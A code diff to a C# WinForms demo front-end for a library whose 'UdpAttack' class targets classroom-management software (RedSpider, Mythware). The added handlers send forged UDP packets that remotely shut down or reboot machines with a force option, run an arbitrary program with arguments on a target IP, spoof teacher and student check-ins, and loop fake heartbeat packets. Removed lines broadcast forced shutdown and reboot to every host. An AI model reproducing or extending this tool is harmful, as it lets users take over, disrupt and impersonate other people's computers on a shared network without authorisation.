@@ -7,6 +7,7 @@ using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
@@ -14,6 +15,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using T4CLLibrary;
 using T4CLLibrary.Mythware;
+using T4CLLibrary.RedSpider;
 
 namespace DemoGUI
 {
@@ -22,6 +24,9 @@ namespace DemoGUI
         Thread _keyboardThread;
         Thread _mouseThread;
         Thread _windowingThread;
+        Thread _heartBeatThread;
+        bool _isHeartBeating = false;
+        List<PhysicalAddress> macAddrs = new List<PhysicalAddress>();
         T4CLLibrary.Jfglzs.PasswordType passwordType = T4CLLibrary.Jfglzs.PasswordType.A;
         public Form1()
         {
@@ -36,7 +41,52 @@ namespace DemoGUI
             _mouseThread.IsBackground = true;
             _mouseThread.Start();
 
+            try
+            {
+                var interfaces = NetworkInterface.GetAllNetworkInterfaces();
+                
+                foreach (var ni in interfaces)
+                {
+                    if (ni.OperationalStatus == OperationalStatus.Up && ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
+                    {
+                        var mac = ni.GetPhysicalAddress();
+                        macAddrs.Add(mac);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                ShowError($"获取MAC地址失败: {ex.Message}");
+            }
 
+        }
+
+
+
+        private void HeartBeat()
+        {
+            try
+            {
+                while (true)
+                {
+                    var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
+                    var mac = textBoxMac.Text;
+                    var macAddr = macAddrs.FirstOrDefault(); //仅为示例，实际应让用户来选择（只是测试时第一个就是以太网网卡）
+
+                    T4CLLibrary.RedSpider.UdpAttack.SendHeartBeatPacket(macAddr,textBoxIP.Text, port, Environment.UserName, Environment.MachineName);
+                    Thread.Sleep(1000);
+                }
+            }
+            catch(ThreadAbortException)
+            {
+                return;
+            }
+            catch (Exception ex)
+            {
+                this.Invoke(new Action(() => ShowError($"发送心跳包失败: {ex.Message}")));
+            }
+            
+            
         }
 
         private void ShowError(string message)
@@ -440,10 +490,9 @@ namespace DemoGUI
             //}
             try
             {
-                T4CLLibrary.RedSpider.UdpAttack.SendShutdownPacket("255.255.255.255", force: true);
-                ShowInfo("发送成功");
-                T4CLLibrary.RedSpider.UdpAttack.SendRebootPacket("255.255.255.255", force: true);
-                ShowInfo("发送成功");
+                var teacherIP = textBoxTeacherIP.Text;
+                T4CLLibrary.RedSpider.UdpAttack.SendRespondCheckInPacket("AAA", "255.255.255.255",teacherIP:teacherIP);
+                ShowInfo($"已发送");
             }
             catch (Exception ex)
             {
@@ -571,7 +620,8 @@ namespace DemoGUI
                 var args = textBoxRSArgs.Text;
                 var ip = textBoxIP.Text;
                 int port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
-                T4CLLibrary.RedSpider.UdpAttack.SendCommandPacket(path, args, ip, port);
+                var maximized = checkBoxRSForceOrMaximize.Checked;
+                T4CLLibrary.RedSpider.UdpAttack.SendCommandPacket(path, args, ip, port,maximized);
                 ShowInfo($"已发送命令到 {ip}:{port}");
             }
             catch (Exception ex)
@@ -624,7 +674,8 @@ namespace DemoGUI
             try
             {
                 var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
-                T4CLLibrary.RedSpider.UdpAttack.SendShutdownPacket(textBoxIP.Text, port);
+                var force = checkBoxRSForceOrMaximize.Checked;
+                T4CLLibrary.RedSpider.UdpAttack.SendShutdownPacket(textBoxIP.Text, port,force);
                 ShowInfo($"已发送关机命令到 {textBoxIP.Text}:{port}");
             }
             catch (Exception ex)
@@ -658,6 +709,80 @@ namespace DemoGUI
             catch (Exception ex)
             {
                 ShowError($"发送禁止聊天数据失败: {ex.Message}");
+            }
+        }
+
+        private void buttonRSReboot_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
+                var force = checkBoxRSForceOrMaximize.Checked;
+                T4CLLibrary.RedSpider.UdpAttack.SendRebootPacket(textBoxIP.Text, port, force);
+                ShowInfo($"已发送重启数据到 {textBoxIP.Text}:{port}");
+            }
+            catch (Exception ex)
+            {
+                ShowError($"发送重启数据失败: {ex.Message}");
+            }
+        }
+
+        private void buttonRSCheckIn_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
+                T4CLLibrary.RedSpider.UdpAttack.SendRequireCheckInPacket(textBoxIP.Text, port, textBoxTeacherIP.Text);
+                ShowInfo($"已发送请求签到数据到 {textBoxIP.Text}:{port}");
+            }
+            catch (Exception ex)
+            {
+                ShowError($"发送请求签到数据失败: {ex.Message}");
+            }
+        }
+
+        private void buttonRSRespondCheckIn_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
+                T4CLLibrary.RedSpider.UdpAttack.SendRespondCheckInPacket(textBoxRSStdName.Text, textBoxIP.Text, port, textBoxTeacherIP.Text);
+                ShowInfo($"已发送响应签到数据到 {textBoxIP.Text}:{port}");
+            }
+            catch (Exception ex)
+            {
+                ShowError($"发送响应签到数据失败: {ex.Message}");
+            }
+        }
+
+        private void buttonRSHeartBeat_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (!_isHeartBeating)
+                {
+                    _isHeartBeating = true;
+                    buttonRSHeartBeat.Text = "停止心跳";
+                    _heartBeatThread = new Thread(HeartBeat)
+                    {
+                        IsBackground = true
+                    };
+                    _heartBeatThread.Start();
+                }
+                else
+                {
+                    _isHeartBeating = false;
+                    buttonRSHeartBeat.Text = "开始心跳";
+                    if (_heartBeatThread != null && _heartBeatThread.IsAlive)
+                    {
+                        _heartBeatThread.Abort();
+                    }
+                }
+            }
+            catch (Exception)
+            {
+
+                throw;
             }
         }
     }
